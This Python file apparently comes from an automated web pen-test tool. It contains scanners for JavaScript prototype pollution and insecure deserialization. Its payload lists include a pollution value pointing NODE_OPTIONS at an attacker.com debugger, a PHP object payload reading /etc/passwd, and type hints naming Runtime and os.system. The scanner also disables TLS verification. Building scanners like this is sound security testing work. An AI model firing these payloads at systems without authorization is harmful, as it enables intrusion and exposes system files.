"""
Jarwis AGI Pen Test - Prototype Pollution Scanner
Detects JavaScript prototype pollution vulnerabilities (A03:2021 - Injection)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class PrototypePollutionScanner:
    """
    Scans for JavaScript Prototype Pollution vulnerabilities
    OWASP A03:2021 - Injection
    
    Prototype pollution can lead to:
    - XSS through polluted DOM properties
    - RCE in server-side JavaScript (Node.js)
    - Authentication bypass
    - Denial of Service
    """
    
    # Prototype pollution payloads
    PP_PAYLOADS = {
        # JSON-based payloads
        'json': [
            {"__proto__": {"admin": True}},
            {"__proto__": {"isAdmin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__": {"polluted": "jarwis_test"}},
            {"__proto__": {"toString": "jarwis"}},
            {"constructor": {"prototype": {"polluted": "jarwis_test"}}},
            {"__proto__": {"shell": "/bin/sh"}},
            {"__proto__": {"NODE_OPTIONS": "--inspect=attacker.com"}},
            {"a": {"__proto__": {"b": 1}}},
            {"__proto__.admin": True},
        ],
        # Query string payloads
        'query': [
            '__proto__[admin]=true',
            '__proto__[isAdmin]=true',
            '__proto__[polluted]=jarwis_test',
            'constructor[prototype][admin]=true',
            '__proto__.admin=true',
            '__proto__[constructor][prototype][admin]=true',
            'a[__proto__][b]=1',
            '__proto__[toString]=jarwis',
        ],
        # Nested object payloads
        'nested': [
            {"user": {"__proto__": {"admin": True}}},
            {"data": {"__proto__": {"polluted": "jarwis_test"}}},
            {"config": {"constructor": {"prototype": {"isAdmin": True}}}},
        ],
    }
    
    # Detection patterns in response
    DETECTION_PATTERNS = [
        'jarwis_test',  # Our canary value
        '"polluted":',
        '"admin":true',
        '"isAdmin":true',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Prototype Pollution scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test common API endpoints
            api_endpoints = [
                '/api/users', '/api/user', '/api/profile', '/api/settings',
                '/api/update', '/api/config', '/api/v1/users', '/api/data',
            ]
            
            for endpoint in api_endpoints:
                url = urljoin(base_url, endpoint)
                await self._test_json_pollution(session, url)
                await self._test_query_pollution(session, url)
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:30]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_json_pollution(session, ep_url)
                        await self._test_query_pollution(session, ep_url)
        
        logger.info(f"Prototype pollution scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_json_pollution(self, session: aiohttp.ClientSession, url: str):
        """Test JSON-based prototype pollution"""
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        
        for payload in self.PP_PAYLOADS['json']:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                async with session.post(url, json=payload, headers=headers) as response:
                    body = await response.text()
                    
                    # Check for pollution indicators
                    if any(pattern in body for pattern in self.DETECTION_PATTERNS):
                        result = ScanResult(
                            id=f"PP-JSON-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="Prototype Pollution via JSON",
                            description="Application is vulnerable to prototype pollution through JSON body.",
                            url=url,
                            method="POST",
                            parameter="__proto__",
                            evidence=f"Payload reflected: {json.dumps(payload)[:100]}",
                            remediation="Use Object.freeze() or null-prototype objects. Sanitize user input.",
                            cwe_id="CWE-1321",
                            poc=json.dumps(payload),
                            reasoning="Prototype pollution payload was processed"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"JSON pollution test error: {e}")
        
        # Test nested pollution
        for payload in self.PP_PAYLOADS['nested']:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                async with session.post(url, json=payload, headers=headers) as response:
                    body = await response.text()
                    
                    if any(pattern in body for pattern in self.DETECTION_PATTERNS):
                        result = ScanResult(
                            id=f"PP-NESTED-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="Nested Prototype Pollution",
                            description="Application vulnerable to nested object prototype pollution.",
                            url=url,
                            method="POST",
                            parameter="nested __proto__",
                            evidence=f"Payload: {json.dumps(payload)[:100]}",
                            remediation="Recursively sanitize nested objects.",
                            cwe_id="CWE-1321",
                            poc=json.dumps(payload),
                            reasoning="Nested pollution payload was processed"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"Nested pollution test error: {e}")
    
    async def _test_query_pollution(self, session: aiohttp.ClientSession, base_url: str):
        """Test query parameter-based prototype pollution"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        for payload in self.PP_PAYLOADS['query']:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                # Append payload to URL
                separator = '&' if '?' in base_url else '?'
                url = f"{base_url}{separator}{payload}"
                
                async with session.get(url, headers=headers) as response:
                    body = await response.text()
                    
                    if any(pattern in body for pattern in self.DETECTION_PATTERNS):
                        result = ScanResult(
                            id=f"PP-QUERY-{len(self.results)+1}",
                            category="A03:2021 - Injection",
                            severity="high",
                            title="Prototype Pollution via Query Parameters",
                            description="Application vulnerable to prototype pollution through query string.",
                            url=url,
                            method="GET",
                            parameter="__proto__",
                            evidence=f"Payload: {payload}",
                            remediation="Parse query strings safely. Don't use object merge on user input.",
                            cwe_id="CWE-1321",
                            poc=payload,
                            reasoning="Query-based pollution payload was reflected"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"Query pollution test error: {e}")


class DeserializationScanner:
    """
    Scans for Insecure Deserialization vulnerabilities
    OWASP A08:2021 - Software and Data Integrity Failures
    
    Targets:
    - Java serialized objects
    - PHP serialized objects
    - Python pickle
    - Ruby Marshal
    - .NET ViewState
    - JSON deserialization with type hints
    """
    
    # Magic bytes for serialized objects
    SERIALIZED_SIGNATURES = {
        'java': b'\xac\xed\x00\x05',  # Java serialization
        'php_serialize': b's:',  # PHP serialize
        'python_pickle': b'\x80\x04',  # Python pickle protocol 4
        'dotnet_viewstate': b'__VIEWSTATE',
    }
    
    # Test payloads for various serialization formats
    TEST_PAYLOADS = {
        'php': [
            # PHP object injection
            'O:8:"stdClass":1:{s:4:"test";s:4:"pwnd";}',
            'a:1:{s:4:"test";s:4:"pwnd";}',
            # PHP POP chain attempt
            'O:15:"SplFileObject":1:{s:10:"file_path";s:11:"/etc/passwd";}',
        ],
        'python': [
            # Base64 encoded pickle payloads (safe test)
            'gASVGAAAAAAAAACMCGJ1aWx0aW5zlIwHZ2V0YXR0cpSTlC4=',
        ],
        'java': [
            # Java serialized object markers
            'rO0ABQ==',  # Base64 of Java serialization header
        ],
        'json_type': [
            # JSON with type hints
            '{"@type":"java.lang.Runtime"}',
            '{"$type":"System.Diagnostics.Process"}',
            '{"__class__":"os.system"}',
        ],
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Deserialization scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Check for ViewState in HTML
            await self._check_viewstate(session, base_url)
            
            # Test serialization endpoints
            endpoints = [
                '/api/import', '/api/load', '/api/deserialize',
                '/import', '/load', '/data', '/api/data',
            ]
            
            for endpoint in endpoints:
                url = urljoin(base_url, endpoint)
                await self._test_php_serialization(session, url)
                await self._test_json_type_hints(session, url)
            
            # Test discovered endpoints
            if hasattr(self.context, 'endpoints'):
                for endpoint in self.context.endpoints[:20]:
                    ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                    if ep_url:
                        await self._test_php_serialization(session, ep_url)
        
        logger.info(f"Deserialization scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _check_viewstate(self, session: aiohttp.ClientSession, base_url: str):
        """Check for .NET ViewState issues"""
        headers = {'User-Agent': 'Mozilla/5.0'}
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            async with session.get(base_url, headers=headers) as response:
                body = await response.text()
                
                # Check for unprotected ViewState
                if '__VIEWSTATE' in body:
                    # Check for MAC validation
                    if '__VIEWSTATEGENERATOR' not in body:
                        result = ScanResult(
                            id=f"DESER-VIEWSTATE-{len(self.results)+1}",
                            category="A08:2021 - Software Integrity Failures",
                            severity="high",
                            title="Potentially Unprotected ViewState",
                            description=".NET ViewState found without MAC validation indicator.",
                            url=base_url,
                            method="GET",
                            evidence="__VIEWSTATE present, no __VIEWSTATEGENERATOR",
                            remediation="Enable ViewState MAC validation. Use encrypted ViewState.",
                            cwe_id="CWE-502",
                            reasoning="ViewState may allow object injection"
                        )
                        self.results.append(result)
                        
        except Exception as e:
            logger.debug(f"ViewState check error: {e}")
    
    async def _test_php_serialization(self, session: aiohttp.ClientSession, url: str):
        """Test for PHP object injection"""
        
        for payload in self.TEST_PAYLOADS['php']:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                # Try in POST body
                headers = {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                data = f'data={payload}'
                
                async with session.post(url, data=data, headers=headers) as response:
                    body = await response.text()
                    
                    # Check for PHP unserialize errors (indicates processing)
                    if 'unserialize' in body.lower() or '__wakeup' in body.lower():
                        result = ScanResult(
                            id=f"DESER-PHP-{len(self.results)+1}",
                            category="A08:2021 - Software Integrity Failures",
                            severity="critical",
                            title="PHP Deserialization Vulnerability",
                            description="Application processes PHP serialized data from user input.",
                            url=url,
                            method="POST",
                            parameter="data",
                            evidence="PHP unserialize error in response",
                            remediation="Never unserialize untrusted data. Use JSON instead.",
                            cwe_id="CWE-502",
                            poc=payload,
                            reasoning="PHP serialization processing detected"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"PHP serialization test error: {e}")
    
    async def _test_json_type_hints(self, session: aiohttp.ClientSession, url: str):
        """Test for JSON deserialization with type hints"""
        headers = {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        }
        
        for payload in self.TEST_PAYLOADS['json_type']:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                async with session.post(url, data=payload, headers=headers) as response:
                    body = await response.text()
                    
                    # Check for type processing indicators
                    error_patterns = [
                        'cannot deserialize', 'type not found', 'class not found',
                        'autoload', 'classloader', 'reflection'
                    ]
                    
                    if any(p in body.lower() for p in error_patterns):
                        result = ScanResult(
                            id=f"DESER-TYPE-{len(self.results)+1}",
                            category="A08:2021 - Software Integrity Failures",
                            severity="high",
                            title="JSON Type Hint Deserialization",
                            description="Application processes type hints in JSON which can lead to RCE.",
                            url=url,
                            method="POST",
                            evidence=f"Type processing error detected",
                            remediation="Disable polymorphic deserialization. Use safe JSON parsers.",
                            cwe_id="CWE-502",
                            poc=payload,
                            reasoning="Type hint processing detected in error"
                        )
                        self.results.append(result)
                        return
                        
            except Exception as e:
                logger.debug(f"JSON type hints test error: {e}")
